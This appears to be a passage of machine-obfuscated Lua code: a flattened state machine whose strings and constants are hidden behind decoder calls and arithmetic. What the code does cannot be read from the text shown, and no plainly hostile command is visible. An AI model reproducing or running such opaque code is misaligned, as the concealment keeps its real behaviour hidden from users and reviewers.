Q=e(n,c)N=z(760160+-784156)B=o[Q]e=z(297496-321398)g=-899177+34328370018010 o=d[e]C[B]=o B=s[u[-212582+212583]]Q=z(452778-476821)o=s[u[380098-380096]]n=33934670116678-(-738932)e=o(Q,n)C=B[e]e=z(49921-73810)o=d[e]Q=s[u[-187141+187142]]n=s[u[78173-78171]]c=n(N,g)e=Q[c]N=z(733793+-757487)B=o[e]Y[C]=B n=9312848482207-294575 Q=z(-295169-(-271454))B=s[u[-813253+813254]]o=s[u[820208-820206]]e=o(Q,n)C=B[e]g=155397775937-287225 e=z(431945-455834)o=d[e]Q=s[u[854006+-854005]]n=s[u[-463638+463640]]c=n(N,g)g=466473+32401265974471 e=Q[c]B=o[e]Q=z(-882332-(-858453))N=z(-895757-(-871987))n=10020409204218-(-95296)Y[C]=B B=s[u[-473728-(-473729)]]o=s[u[390558+-390556]]e=o(Q,n)C=B[e]e=z(-984455+960566)o=d[e]Q=s[u[-331028-(-331029)]]n=s[u[-892991-(-892993)]]c=n(N,g)e=Q[c]B=o[e]Y[C]=B C=112798+6757880 B=-900696-(-900697)o=1038095+-1038085 e=o o=-668145-(-668146)Q=o o=560130-560130 n=Q<o o=B-Q else C=361568+-259093 l=s[u[444233-444228]]O=z(-758766+734726)O=l[O]O=O(l)end else if C<7334257-(-14415)then H=s[n]C=5542388-300332 m=34369729258132-631824 x=s[O]k=s[Y]b=z(45447+-69352)U=k(b,m)a=x[U]W=H==a Z=W else i=z(-237236+213417)C=d[i]a=z(568176-591718)H=d[a]i=C(H)C=z(-893747+869892)d[C]=i C=-160621+4010763 end end else if C<7096390-(-488614)then if C<-1014110+8559014 then v=C f=-149319+149320 V=m[f]f=false t=V==f C=t and 12225165-(-730136)or 120210-102766 A=t else w=z(-896074-(-872173))n=z(-108550-(-85005))c=27828454448611-551749 B=d[w]o=s[u[-814265-(-814266)]]N=z(903002+-926801)e=s[u[-855716+855718]]Q=e(n,c)w=o[Q]c=894067+2689846206577 C=B[w]M=28897077021798-677846 g=719599866812-(-650643)n=z(-251623+228000)o=s[u[-342934-(-342935)]]Z=163839+29087403144425 e=s[u[572428+-572426]]Q=e(n,c)w=o[Q]Q=s[u[-213334-(-213335)]]q=6659090666007-(-473605)n=s[u[-258061+258063]]c=n(N,g)e=Q[c]g=z(222444-246382)n=s[u[975948+-975947]]c=s[u[-1022842-(-1022844)]]N=c(g,Z)Z=z(569625-593360)Q=n[N]W=519111+25883852751694 c=s[u[-54406-(-54407)]]N=s[u[-124283+124285]]g=N(Z,M)n=c[g]N=s[u[-845570-(-845571)]]g=s[u[54372+-54370]]M=z(93046-116943)B=z(-198696-(-175047))Z=g(M,W)c=N[Z]B=C[B]W=z(663875-687616)g=s[u[224301-224300]]Z=s[u[-993886-(-993888)]]M=Z(W,q)N=g[M]g=-194170-(-194173)o={[e]=Q,[n]=c,[N]=g}B=B(C,w,o)C=d[z(-552762+529033)]B={}end else if C<6656705-(-985962)then X=s[O]ze=392118+25226789138989 de=z(607703-631429)J=s[Y]Ce=J(de,ze)C=-412022+4928397 f=X[Ce]t=f else C=true C=-424224+15817699 end end end else if C<7816946-(-26354)then if C<8745050-928251 then if C<528970+7188245 then f=-721130+8094741548963 x=z(497773-521674)t=-70907+879338378900 m=z(-57980-(-33947))X=666290+28267800676537 J=24696660681251-(-363209)a=d[x]k=s[O]U=s[Y]b=U(m,t)t=-1030202+6872291902650 x=k[b]m=z(-648924-(-625367))M=a[x]k=s[O]U=s[Y]b=U(m,t)x=k[b]b=s[O]m=s[Y]V=z(166003-189862)t=m(V,f)U=b[t]f=z(-540945-(-517222))m=s[O]t=s[Y]V=t(f,X)X=z(506720-530264)b=m[V]t=s[O]V=s[Y]f=V(X,J)m=t[f]V=C C=H and 4453982-(-62393)or 161789+7479792 t=H else l=nil C=227168+5035341 end else if C<-304874+8134782 then t=-119481+119482 v=m[t]A=v C=12753166-75109 else C=-783156+16399053 end end else if C<8324659-354832 then if C<79317+7776222 then H=#Z W=-949206+949207 M=j(W,H)W=o(Z,M)x=-899918+899919 H=s[g]p=W-x a=e(p)M=nil H[W]=a W=nil C=658957+2904732 else c=-929828+13379133720698 o=s[u[604359+-604356]]e=s[u[-767871-(-767875)]]n=z(519576+-543326)Q=e(n,c)w=o[Q]Y=O[w]w=100926+-100926 j=Y>w C=j and 5994797-(-894782)or 12593921-469515 end else e=z(-1063376-(-1039676))o=d[e]N=z(751991+-776079)Q=s[u[-833309-(-833311)]]g=9427502472757-(-258801)n=s[u[-135088+135091]]c=n(N,g)e=Q[c]g=486666+26903469310949 B=o[e]Q=s[u[-307873+307875]]n=s[u[-1038800-(-1038803)]]N=z(236686-260732)c=n(N,g)e=Q[c]o=B(e)s[u[996944-996940]]=o M=z(1329-24932)g=14316581431544-265966 N=z(-539047+515199)B=s[u[567406-567402]]Q=s[u[-432004-(-432006)]]n=s[u[-767299-(-767302)]]c=n(N,g)e=Q[c]N=z(-614986-(-591000))Q=896636-806636 B[e]=Q B=s[u[-41041-(-41045)]]g=602876+18966405099395 Q=s[u[336745-336743]]n=s[u[4691-4688]]c=n(N,g)e=Q[c]c=z(-618101+594212)n=d[c]W=429580+9159547912861 N=s[u[595423-595421]]g=s[u[275631-275628]]Z=g(M,W)c=N[Z]N=-852239+9000852239 Q=n[c]c=920770+8999079230 g=8999272334-(-727666)n=Q(c,N,g)B[e]=n B=s[u[564308-564304]]Q=s[u[-812770+812772]]n=s[u[-873236-(-873239)]]g=10871999747528-(-32254)N=z(343608-367195)c=n(N,g)M=z(-150929-(-126913))e=Q[c]n=s[Y]N=s[u[297429+-297427]]W=22408340271662-412012 g=s[u[120959+-120956]]Z=g(M,W)g=-281353+20312703528955 c=N[Z]N=z(-614613+591051)Q=n[c]q=317600+16356542285088 Z=33311270670976-(-1010199)B[e]=Q B=s[u[789736-789732]]Q=s[u[347581-347579]]n=s[u[396795+-396792]]c=n(N,g)e=Q[c]g=z(-270986-(-247325))Q=s[Y]B[e]=Q Q=z(-1062789-(-1039089))e=d[Q]n=s[u[-756106+756108]]c=s[u[488728-488725]]N=c(g,Z)Q=n[N]B=e[Q]n=s[u[-925341+925343]]c=s[u[-842653-(-842656)]]g=z(84078-108024)Z=-961168+32509366134194 N=c(g,Z)Q=n[N]g=z(-60806+36748)e=B(Q)s[u[-271649+271654]]=e B=s[u[850968-850963]]n=s[u[-846536-(-846538)]]Z=-620889+14890910733423 W=z(-532444+508642)c=s[u[-986645-(-986648)]]N=c(g,Z)Q=n[N]N=z(770345-794234)c=d[N]g=s[u[-254193+254195]]Z=s[u[-504797-(-504800)]]M=Z(W,q)N=g[M]n=c[N]W=z(-245064+221005)Z=-433838+9000433838 g=9000895191-895191 N=231845+8999768155 c=n(N,g,Z)g=z(1003150-1026726)B[Q]=c B=s[u[-195049-(-195054)]]n=s[u[-310279-(-310281)]]Z=17193829156606-26552 c=s[u[-619265+619268]]N=c(g,Z)Q=n[N]N=z(990391-1014280)c=d[N]q=-173778+31403522334705 g=s[u[665153-665151]]Z=s[u[874977+-874974]]M=Z(W,q)N=g[M]M=524034+8706158301396 g=z(-948803+925262)n=c[N]Z=31215779437542-(-515297)B[Q]=n B=s[u[124239+-124234]]n=s[u[990853+-990851]]c=s[u[-56381-(-56384)]]N=c(g,Z)Q=n[N]n=s[Y]g=z(934244-958039)B[Q]=n B=s[w]n=s[u[-705554-(-705556)]]Z=455234+6621763361225 c=s[u[-34799+34802]]N=c(g,Z)Q=n[N]n=true B[Q]=n Q=z(-178138-(-154237))B=d[Q]c=s[u[409920+-409918]]Z=z(-787767-(-763729))N=s[u[602995+-602992]]g=N(Z,M)n=c[g]W=518031+22959179252276 Z=z(-830878+807234)Q=z(76766-100438)Q=B[Q]Q=Q(B,n)c=s[u[-449383-(-449385)]]N=s[u[1016687-1016684]]M=29940214529552-(-833638)g=N(Z,M)n=c[g]B=Q[n]c=F(9504220-439418,{u[-800363+800365],u[-536479-(-536482)];u[561672+-561666];u[392577-392570]})n=z(740525-764535)n=B[n]Z=z(677124-700765)n=n(B,c)c=s[u[877396-877394]]M=2843676093214-(-317966)N=s[u[1012020+-1012017]]g=N(Z,M)n=c[g]M=z(-54943-(-31235))B=Q[n]n=z(757809+-781819)c=F(1003609+3063097,{u[230346+-230344],u[-664518+664521];u[553300-553294],u[343913+-343906]})n=B[n]n=n(B,c)Q=nil c=z(-23564+-58)n=d[c]N=s[u[368504+-368502]]g=s[u[751981-751978]]Z=g(M,W)C=-90535+8212342 c=N[Z]B=n[c]c=r(9936347-824744,{u[-246321+246322],Y,u[707452-707450],u[-403690+403693],u[-70942-(-70946)],w,u[-274899-(-274905)],u[-914528+914535];u[744885+-744880],u[-754968-(-754976)]})n=B(c)end end end else if C<48138+8459359 then if C<-775962+8907815 then if C<7245889-(-862474)then if C<-247174+8345386 then C=-610827+5140506 else l=nil C=d[z(-1054904-(-1031270))]B={}end else if C<438999+7676767 then n=z(-460509+436632)Z=z(780661+-804320)Q=d[n]n=Q(l)c=s[u[109580-109578]]N=s[u[-993462-(-993465)]]M=20317230714187-92247 g=N(Z,M)Q=c[g]C=-718742+1532308 e=n~=Q w=e else C=d[z(337367+-361204)]w=T(w)O=nil l=nil B={}j=nil Y=T(Y)end end else if C<8033773-(-313649)then if C<-658141+8815580 then l=s[u[412370-412364]]e=6529919009817-669753 o=z(705264-728961)j=s[u[291371-291368]]Y=s[u[768355+-768351]]w=Y(o,e)O=j[w]C=7967561-985682 j=false l[O]=j else o=z(-976719-(-952818))B=d[o]c=z(-420015-(-395960))e=s[u[-1026693+1026694]]N=31286142175543-(-552881)Q=s[u[-378149+378151]]M=21929303218264-(-364427)n=Q(c,N)o=e[n]l=nil C=B[o]c=z(108544-132235)e=s[u[16933+-16932]]Q=s[u[611000-610998]]Z=796803+18049105836113 q=807229+12231698269442 N=31705335944143-(-222684)n=Q(c,N)B=z(441564+-465213)o=e[n]n=s[u[950209+-950208]]g=z(573150+-596883)c=s[u[-1022505+1022507]]N=c(g,Z)Q=n[N]c=s[u[-268294+268295]]Z=z(277637-301348)N=s[u[252506-252504]]g=N(Z,M)M=z(-688982-(-665428))n=c[g]W=-459649+19070857242161 K=-241+19207522624481 Y=nil N=s[u[-818335+818336]]g=s[u[-801099-(-801101)]]Z=g(M,W)c=N[Z]W=z(32458+-56202)g=s[u[162861-162860]]Z=s[u[639336+-639334]]M=Z(W,q)N=g[M]Z=s[u[-748549+748550]]q=z(359903-383494)M=s[u[-983556-(-983558)]]B=C[B]W=M(q,K)g=Z[W]Z=797931+-797925 e={[Q]=n;[c]=N;[g]=Z}B=B(C,o,e)o=z(-166578+142956)B=d[o]N=15891926009212-698516 c=z(-664129+640298)w=nil O=nil e=s[u[-669710+669711]]Q=s[u[-174015-(-174017)]]n=Q(c,N)o=e[n]C=B[o]o=29142-29139 j=nil B=C(o)B=z(-74130-(-50090))C=s[u[-596002-(-596009)]]B=C[B]B=B(C)C=13083738-(-141799)end else l=D[-552030-(-552031)]o=-143377+4626641549435 B=z(806367+-830179)C=d[B]w=z(-136625+112625)e=z(-928935+905352)O=s[u[-621238-(-621239)]]j=s[u[-119783-(-119785)]]Y=j(w,o)B=O[Y]O=l C[B]=O j=z(-35704-(-11892))O=d[j]Q=25631978203247-(-804400)Y=s[u[610107+-610106]]w=s[u[-41666-(-41668)]]o=w(e,Q)j=Y[o]B=O[j]O=nil C=B==O C=C and 10910283-315664 or 8602878-499078 end end else if C<613683+8020876 then if C<7857316-(-752672)then if C<-738973+9316861 then l=D[-782849+782850]O=not l B=O C=O and-658900+2789010 or 440825+4690586 else C=-468537+6802057 end else if C<8359234-(-255103)then l=s[u[-763403+763408]]C=l and-299363+7622778 or-211588-(-314063)else C={}O=-617728-(-617729)l=C j=s[u[-719596-(-719605)]]Y=j j=-458420+458421 w=j j=645402-645402 o=w<j C=-497193+4217325 j=O-w end end else if C<9616936-651496 then if C<955171+7922979 then n=s[u[633166+-633165]]w=j c=s[u[319676+-319674]]Z=33728+7712106498631 g=z(-393648-(-369691))N=c(g,Z)Q=n[N]e=o[Q]Q=s[u[72357+-72354]]C=e==Q C=C and 599094+14801738 or 727939+13217075 else C=B and 189721+11200620 or 1106625-(-380153)end else j,o=Y(O,j)C=j and 9579448-920554 or 1632894-976461 end end end end end end else if C<13457648-295959 then if C<-782762+12037278 then if C<10633157-411407 then if C<8924525-(-461520)then if C<9746179-644088 then if C<8041974-(-974935)then if C<698408+8289328 then C=d[z(-498250-(-474501))]B={}else k=z(530289+-554003)Z=z(623828+-647647)g=d[Z]H=s[O]U=22576967198705-(-33056)a=s[Y]x=a(k,U)W=H[x]M=Q[W]Z=g(M)k=8734240529267-(-619632)W=s[O]H=s[Y]x=z(-1048599-(-1024680))a=H(x,k)M=W[a]t=29895173061376-(-899937)H=z(-712431+688612)W=d[H]b=z(-749989+726422)m=-959266+25445145776490 x=z(-112925+89365)a=d[x]x={a()}H=W(E(x))x=s[O]k=s[Y]U=k(b,m)W=z(80456-104431)a=x[U]m=z(-682696-(-658791))k=s[O]W=H[W]U=s[Y]b=U(m,t)C=15772617-364373 x=k[b]W=W(H,a,x)g=M..W N=Z..g s[n]=N end else if C<8697630-(-375556)then o=z(-43514-(-19500))e=4463738320253-(-774817)j=s[u[-857651+857652]]l=D[134454-134453]Y=s[u[-878675-(-878677)]]w=Y(o,e)O=j[w]B=l[O]c=13743702198843-(-184004)w=z(948264-971946)n=z(683800-707804)Y=d[w]o=s[u[-918242+918243]]e=s[u[-1035450+1035452]]Q=e(n,c)n=-317132+23100491546833 w=o[Q]j=Y[w]w=s[u[938715+-938714]]Q=z(-428098+404041)o=s[u[358014+-358012]]e=o(Q,n)Y=w[e]O=j[Y]C=B==O C=C and 11112644-(-99154)or 569648+8867563 else j=s[u[-889704+889705]]n=z(297689+-321669)Y=s[u[-263626-(-263628)]]e=-806645+16768807103861 o=z(3922-28011)w=Y(o,e)O=j[w]B=l[O]w=z(-967400-(-943718))c=12347178646503-(-39566)Y=d[w]o=s[u[-470416-(-470417)]]e=s[u[-400075+400077]]Q=e(n,c)w=o[Q]Q=z(-602301+578538)j=Y[w]n=937164+456647603208 w=s[u[418242-418241]]o=s[u[678629-678627]]e=o(Q,n)Y=w[e]O=j[Y]C=B==O C=C and 6410718-(-525540)or 4550742-284725 end end else if C<134632+9187284 then if C<6077+9158939 then C=14317438-(-298648)else C=-812265+5102082 o=s[w]B=o end else if C<9300317-(-27798)then v=s[O]C=v and-490175+8316169 or 13452546-774489 A=v else Y=s[j]C=15988839-140704 l=not Y B=l end end end else if C<804833+9111747 then if C<812054+9013027 then if C<674891+8999885 then B={}l=nil C=d[z(273446-297409)]else l=s[u[620014+-620013]]C=l and 15489674-303766 or 955353+15609585 B=l end else if C<-648636+10509771 then Y=s[u[425483-425482]]w=s[u[-68561-(-68563)]]e=z(-1060924-(-1037262))c=z(-288323-(-264556))Q=617305+27152913516043 N=416287+14808621580496 o=w(e,Q)j=Y[o]o=z(-927958-(-904276))O=l[j]w=d[o]e=s[u[-770411+770412]]Q=s[u[484938+-484936]]n=Q(c,N)o=e[n]c=202101+8475214543349 Y=w[o]n=z(-354995+331086)o=s[u[-885719+885720]]e=s[u[-324499-(-324501)]]Q=e(n,c)w=o[Q]j=Y[w]B=O==j C=B and 11238193-182581 or-222305+4066220 else C=208957+11246930 w=nil o=nil end end else if C<10380683-241989 then if C<430348+9556470 then C=Q and 751731+9676929 or 6675407-701407 else C=5189777-(-291505)s[O]=B end else o=s[O]n=z(-379069+355385)c=10016956260635-(-307485)g=z(831715+-855754)e=s[Y]Q=e(n,c)Z=360064+27388462674769 e=z(-151937+128036)w=o[Q]o=P()s[o]=w w=d[e]n=s[O]c=s[Y]N=c(g,Z)M=557804+17824369614208 e=z(229859+-253531)e=w[e]Q=n[N]e=e(w,Q)Z=z(787666+-811624)Q=z(-244722-(-220821))w=d[Q]c=s[O]N=s[Y]Q=z(-876713-(-853041))g=N(Z,M)Q=w[Q]M=17132048396464-(-306809)n=c[g]Q=Q(w,n)w=P()Z=z(-224912+201085)s[w]=Q c=s[O]N=s[Y]g=N(Z,M)n=c[g]g=y(5403353-(-961784),{O,Y})c=z(-726267+702574)Q=e[n]n=d[c]Z={n(g)}N=Z[-1044315-(-1044317)]n=P()c=Z[211374-211373]s[n]=N g=C Z=not c N=Z C=Z and 114250+12418945 or 500417+1938317 end end end else if C<902709+9690252 then if C<-707491+11253147 then if C<10778482-323409 then if C<10786134-524430 then V=z(1015559+-1039328)b=s[O]m=s[Y]f=-1019768+26698465378312 t=m(V,f)U=b[t]x=a==U C=x and 797393+11646084 or-33742+3108998 else Q=s[u[-944147-(-944148)]]g=-191265+27333150760152 N=z(222136-246167)n=s[u[-195072+195074]]c=n(N,g)Z=z(-242929+219186)C=Q[c]W=330380+31143542337050 c=s[u[995527+-995526]]N=s[u[988547-988545]]M=-359571+4722597889322 g=N(Z,M)M=z(-301697-(-277823))n=c[g]Q=o[n]N=s[u[824074-824073]]g=s[u[-263836-(-263838)]]Z=g(M,W)c=N[Z]n=o[c]B={C;Q,n}C=d[z(151411-175067)]end else if C<11201879-680138 then n=z(-241296+217549)c=16931207909281-798933 Y=s[u[827744-827738]]o=s[u[-661105-(-661108)]]e=s[u[602046+-602042]]Q=e(n,c)C=296139+12219941 w=o[Q]j=Y[w]l=j else j=125443-125442 O=s[u[-826599+826602]]l=O~=j C=l and 13655329-(-750463)or 6928871-(-294009)end end else if C<10800635-236835 then if C<10839252-288473 then l=z(-722293-(-698692))C=d[l]j=478030+-478030 O=s[u[744847+-744839]]l=C(O,j)C=-944181+9573020 else l=s[u[726471-726469]]Y=s[u[292308+-292305]]e=480848+19776237669801 C=nil o=z(-127191-(-103520))w=Y(o,e)B=l[w]B={C,B}C=d[z(-213094-(-189186))]end else if C<10499338-(-75671)then w=z(-688579-(-664678))l=D[415345+-415344]Y=d[w]o=s[u[744704+-744703]]e=s[u[89560+-89558]]n=z(-334990-(-310972))c=-467470+13385528769127 Q=e(n,c)n=-598227+22658732182026 w=o[Q]j=Y[w]Q=z(-27640+4033)w=s[u[-600602-(-600603)]]o=s[u[495710+-495708]]e=o(Q,n)Y=w[e]O=j[Y]e=z(831482+-855310)Y=s[u[777582+-777581]]Q=12547979481379-1047120 w=s[u[1015675-1015673]]o=w(e,Q)e=-889267+10010724312040 j=Y[o]B=O[j]j=s[u[-484999-(-485000)]]Y=s[u[779587+-779585]]o=z(332537+-356093)w=Y(o,e)O=j[w]w=z(-7525+-16525)C=B[O]O=s[u[864620+-864619]]j=s[u[475529+-475527]]o=15313689149446-320556 Y=j(w,o)B=O[Y]O=l l=nil C[B]=O B={}C=d[z(399638-423439)]else a=nil j=nil M=T(M)n=T(n)B={}O=T(O)W=nil Y=T(Y)w=T(w)H=nil Z=T(Z)o=T(o)Q=nil C=d[z(-192945+169193)]e=nil g=T(g)k=nil c=nil end end end else if C<10814219-(-177816)then if C<11518857-708158 then if C<10578056-(-102779)then B=z(-892595-(-868783))C=d[B]O=s[u[-491294-(-491295)]]w=z(-34130+10188)j=s[u[-310305+310307]]o=987408+31809566238924 Y=j(w,o)B=O[Y]e=27839330003426-669503 O=true o=z(-1010922-(-987202))N=-979873+31234250992753 C[B]=O O=z(-819615+795714)B=d[O]j=s[u[367013-367012]]n=1095515767289-507899 Y=s[u[93437-93435]]w=Y(o,e)O=j[w]C=B[O]e=11802037371627-1043828 o=z(-1041369+1017333)c=872467+31575027394908 j=s[u[-102876+102877]]Q=z(-424667-(-400964))Y=s[u[-776944+776946]]w=Y(o,e)O=j[w]w=s[u[-348014-(-348015)]]o=s[u[-111918+111920]]e=o(Q,n)Y=w[e]o=s[u[-726161-(-726162)]]n=z(92732-116794)e=s[u[835073-835071]]Q=e(n,c)w=o[Q]e=s[u[-982156+982157]]c=z(103255+-126795)Q=s[u[-655686+655688]]Z=6998645818840-(-165602)n=Q(c,N)o=e[n]Q=s[u[567325+-567324]]g=264188+6445173441469 N=z(146512-170287)n=s[u[-293399-(-293401)]]c=n(N,g)e=Q[c]n=s[u[84587-84586]]c=s[u[684255+-684253]]g=z(103265+-127065)N=c(g,Z)Q=n[N]B=z(578821+-602470)n=-753549+753554 j={[Y]=w;[o]=e,[Q]=n}e=328661+23576832091917 o=z(-113174-(-89245))B=C[B]B=B(C,O,j)B=z(861181+-885082)C=d[B]j=s[u[152544-152543]]Y=s[u[-804366-(-804368)]]Q=z(36549-60616)w=Y(o,e)n=4878262235322-845787 Y=z(223695-247596)O=j[w]B=z(36903+-60575)B=C[B]B=B(C,O)O=B j=d[Y]w=s[u[-549574-(-549575)]]o=s[u[-275936+275938]]e=o(Q,n)Y=w[e]B=j[Y]Y=s[u[147027-147026]]e=z(321088+-345073)w=s[u[273853+-273851]]Q=672091+7118924073880 o=w(e,Q)e=z(-104072+80478)j=Y[o]C=B[j]j=P()s[j]=C Y=s[u[289298+-289297]]w=s[u[-19667-(-19669)]]Q=5961833237067-982899 o=w(e,Q)B=Y[o]C=O[B]Y=R(113736+6047602,{u[-977661+977662],u[-774649-(-774651)],j})O=nil B=z(221053-245063)B=C[B]B=B(C,Y)C=532218+7571582 j=T(j)else e=z(504777-528678)o=d[e]g=17669347140201-410182 Q=s[O]n=s[Y]N=z(-439469+415464)W=19748212447770-(-100817)H=347665+28290605114724 c=n(N,g)e=Q[c]x=26349280725175-858314 N=z(-775971+752048)Z=z(911875+-935756)B={}w=o[e]Q=s[O]n=s[Y]g=835408+12822771587075 c=n(N,g)M=393544+30221648508337 e=Q[c]c=s[O]N=s[Y]g=N(Z,M)M=z(212842-236699)a=-296305+1119464277882 n=c[g]N=s[O]g=s[Y]Z=g(M,W)c=N[Z]g=s[O]Z=s[Y]W=z(-412990-(-389309))M=Z(W,H)H=z(653637-677410)N=g[M]Z=s[O]M=s[Y]W=M(H,a)g=Z[W]M=s[O]W=s[Y]a=z(-852836-(-829077))o=z(961047+-984696)H=W(a,x)Z=M[H]o=w[o]M=655060+-655054 Q={[n]=c;[N]=g,[Z]=M}o=o(w,e,Q)C=d[z(-568567-(-544698))]end else if C<10112310-(-756900)then n=857648+-857393 O=j C=s[u[-803745+803746]]Q=139242-139242 e=C(Q,n)C=3344620-(-375512)l[O]=e O=nil else Se,Be=ue(Ge,Se)C=Se and 1471780-231399 or 864771+12395172 end end else if C<10241560-(-916918)then if C<12040989-996257 then C=d[z(-1042621-(-1018610))]j=z(119728-143519)O=d[j]j=z(-30051+6072)l=O[j]j=s[u[155444-155443]]O={l(j)}B={E(O)}else B=true s[u[-906729-(-906733)]]=B C=-444961+4288876 end else o=z(549850+-573770)e=16433176666077-(-572935)j=s[u[272133+-272132]]c=32296349864447-137024 Y=s[u[-321034+321036]]w=Y(o,e)O=j[w]w=z(522366+-546048)n=z(347699-371476)B=l[O]Y=d[w]o=s[u[94693-94692]]e=s[u[-1016972-(-1016974)]]Q=e(n,c)w=o[Q]n=205970+28723614748589 j=Y[w]w=s[u[794686+-794685]]Q=z(-1066367-(-1042378))o=s[u[789802-789800]]e=o(Q,n)Y=w[e]O=j[Y]C=B==O C=C and-135972-(-223222)or 9480215-(-346036)end end end end else if C<1030647+11204692 then if C<11528419-(-136986)then if C<12431633-984868 then if C<-527872+11907030 then if C<11149484-(-206519)then Y=s[u[-211068-(-211069)]]w=s[u[842584+-842582]]e=z(982796-1006501)Q=658646+6874411204523 o=w(e,Q)j=Y[o]O=l[j]j=z(-936211-(-912246))C=-575957+4336377 j=O[j]j=j(O)B=j else O=s[u[192424-192421]]Q=-559343+966217321136 Y=s[u[531652-531651]]e=z(-355627-(-332052))w=s[u[-484643-(-484645)]]o=w(e,Q)j=Y[o]l=O[j]Y=s[u[686792-686791]]w=s[u[841219+-841217]]O=z(-1025968-(-1001912))O=l[O]C=4918995-755958 Q=-389755+20664512092177 e=z(229057+-253012)o=w(e,Q)j=Y[o]O=O(l,j)B=O end else if C<148827+11237183 then w=z(-355191+331644)l=z(462418+-486320)B=d[l]c=z(691698-715602)o=-863232+9455548759347 M=490998+17745117864529 O=s[u[279135-279132]]Q=z(323214-347060)j=s[u[-147685-(-147689)]]Y=j(w,o)l=O[Y]C=B[l]l=C w=z(-256592-(-232853))C=s[u[-1038076-(-1038081)]]O=s[u[-679313+679316]]n=21525967513947-(-785868)o=20284173744063-905946 j=s[u[-222101+222105]]Y=j(w,o)B=O[Y]Z=2293630837714-958374 Y=z(-490867+467027)j=d[Y]w=s[u[199005+-199002]]o=s[u[456446-456442]]g=z(77998+-101878)e=o(Q,n)Y=w[e]N=-754037+25812091252840 O=j[Y]w=s[u[542660-542658]]e=s[u[-616543-(-616546)]]Q=s[u[-436044+436048]]n=Q(c,N)o=e[n]Y=w[o]e=s[u[-550006-(-550008)]]n=s[u[281665-281662]]c=s[u[-122916+122920]]N=c(g,Z)Q=n[N]o=e[Q]c=s[u[873291+-873288]]N=s[u[1010732+-1010728]]Z=z(794858+-818693)g=N(Z,M)n=c[g]Z=z(63219+-87166)Q=l[n]c=s[u[212976+-212973]]M=21843497474620-(-871807)N=s[u[-787662+787666]]g=N(Z,M)n=c[g]e=Q[n]w=o+e e=-118442+8915393814241 j=O(Y,w)C[B]=j B=s[u[597266-597260]]j=s[u[-568951-(-568954)]]o=z(312341-336366)Y=s[u[-477002-(-477006)]]w=Y(o,e)O=j[w]C=B[O]O=C C=s[u[782236+-782229]]C=C and 5528417-(-937645)or 14358465-648837 else B=z(315605-339273)Y=z(506488-530307)C=d[B]Q=z(823474+-847167)l=s[u[585696+-585692]]j=d[Y]e=d[Q]n=y(1916549-408222,{})Q={e(n)}o={E(Q)}e=505847-505845 w=o[e]Y=j(w)j=z(107800-131352)O=l(Y,j)l={O()}B=C(E(l))l=B O=s[u[215506+-215501]]B=O C=O and 816309+13042652 or 692394+12579580 end end else if C<-650479+12113750 then if C<-511409+11961071 then O=D[298762+-298760]l=D[-120625+120626]C=s[u[-67186+67187]]j=C C=j[O]C=C and 7969446-127860 or 422653+13420982 else j,o=Y(O,j)C=j and 10782695-(-893413)or-849028+5569724 end else if C<11167751-(-365839)then e=s[u[842325+-842324]]N=709008+28409950331421 c=z(900209-923962)Q=s[u[-840630-(-840632)]]n=Q(c,N)C=e[n]e=false o[C]=e C=-186088+10050667 else B=z(503627-527482)C=d[B]l=z(-133189-(-109647))B=d[l]l=z(293970-317512)d[l]=C l=z(917764+-941619)d[l]=B l=s[u[-631867-(-631868)]]O=l()C=70517+14570188 end end end else if C<148772+11830842 then if C<284532+11451356 then if C<12078844-402992 then B=z(561683-585546)w=z(-463922-(-439913))C=d[B]w=l[w]Y={w(l)}w={C(E(Y))}j=w[245922-245919]O=w[-227150-(-227152)]B=w[-380142+380143]Y=B C=209277+11246610 else C=z(329733+-353723)w=j g=31676861531076-330278 Q=s[u[514837+-514836]]N=z(-193650-(-169910))n=s[u[-962618-(-962620)]]c=n(N,g)e=Q[c]C=o[C]C=C(o,e)C=C and 11149805-(-314024)or-976376+10840955 end else if C<12237453-288419 then n=z(-733584-(-709763))B=z(-16856-7007)C=d[B]Y=s[u[312431-312429]]o=s[u[528034-528031]]e=s[u[95029+-95025]]c=266357+2229760390041 Q=e(n,c)w=o[Q]j=Y[w]w=z(-397362+373353)w=j[w]Y={w(j)}j={C(E(Y))}l=j[779494-779492]B=j[-458794-(-458795)]C=15735066-(-42191)O=j[40450+-40447]j=B else C=-734183+2056505 B=false s[u[194608-194604]]=B end end else if C<13163804-1039668 then if C<12699157-608543 then j=696098-695857 O=s[u[740259+-740257]]l=O*j O=30261790226289-409702 B=l+O l=741404+35184371347428 C=B%l s[u[571338-571336]]=C O=-189852+189853 l=s[u[119897-119894]]C=466641+6756239 B=l~=O else B={}l=D[675690-675689]C=l l=nil s[u[-568020-(-568021)]]=C C=d[z(833279-857280)]end else n=-26050+29812310055932 j=s[u[-874131+874140]]w=s[u[-72448+72451]]o=s[u[152617-152613]]Q=z(626583-650271)e=o(Q,n)C=14520590-(-1036780)Y=w[e]g=2122584241179-(-872385)e=z(-966934-(-943045))o=d[e]Q=s[u[1009048+-1009045]]N=z(330922+-354512)n=s[u[-806213+806217]]c=n(N,g)e=Q[c]n=-416782-(-416782)w=o[e]Q=-789021-(-789021)e=760876+-760876 o=w(e,Q,n)j[Y]=o end end end else if C<12876513-245634 then if C<11898262-(-583155)then if C<592114+11807715 then if C<103320+12262251 then Y=nil C=8483057-678737 O=nil j=nil w=nil else C=-2295+4154441 end else if C<-521119+12975340 then U=z(831427+-854978)x=d[U]ze=12632997645123-144457 Ce=613481+2827337263291 m=z(-890204-(-866303))b=d[m]V=s[O]de=-328170+4192271813002 J=z(591404+-615029)f=s[Y]X=f(J,Ce)C=10358224-(-231542)t=V[X]ue=3340252353467-69032 Ce=8274487231981-(-198944)V=z(816048+-839721)V=b[V]Ge=z(-859933-(-835964))J=3340712059286-(-173181)De=-357112+32008482647345 m={V(b,t)}X=z(-933043-(-909229))U=x(E(m))je=26832095515534-(-1006912)x=U()le=z(970095+-993781)t=s[O]V=s[Y]f=V(X,J)U=z(232184+-255956)m=t[f]V=s[O]f=s[Y]J=z(-559142+535363)X=f(J,Ce)U=x[U]t=V[X]f=s[O]Ce=z(-292232+268557)X=s[Y]J=X(Ce,de)Ee=33950275876002-(-411935)V=f[J]X=s[O]J=s[Y]de=z(316062-339976)Ce=J(de,ze)ze=z(-1006999+983248)f=X[Ce]J=s[O]Ce=s[Y]de=Ce(ze,Ee)Ee=z(966528-990455)X=J[de]Ce=s[O]de=s[Y]ze=de(Ee,De)J=Ce[ze]de=s[O]De=z(698866-722931)ze=s[Y]se=10927826646577-582225 